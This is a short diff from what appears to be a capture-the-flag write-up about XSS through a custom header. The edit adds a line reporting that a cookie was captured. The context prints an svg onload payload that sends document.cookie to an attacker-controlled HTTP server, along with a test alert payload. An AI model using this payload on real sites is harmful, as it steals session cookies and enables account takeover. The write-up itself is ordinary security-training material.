@@ -90,4 +90,4 @@ A simple XSS payload (<script>alert(10)</script>) was inserted into the custom h
 <svg onload="new Image().src='http://10.10.14.107/?c='+document.cookie">
 ```
 
-An HTTP server was started on the attacker machine, and a cookie-stealing payload was inserted into the custom header.
+An HTTP server was started on the attacker machine, and a cookie-stealing payload was inserted into the custom header. Then, new cookie was revealed : `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`
